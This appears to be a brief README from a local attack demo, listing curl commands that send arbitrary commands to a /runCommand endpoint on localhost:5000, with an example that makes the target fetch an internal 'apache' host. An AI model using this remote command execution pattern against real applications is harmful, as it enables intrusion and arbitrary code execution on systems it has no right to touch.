# commands to run to attact the applicaion 

curl localhost:5000/runCommand?command={Command to be executed on the target applicaion}

### Example to run from local computer
curl localhost:5000/runCommand?command=curl -L "http://apache/testAttact"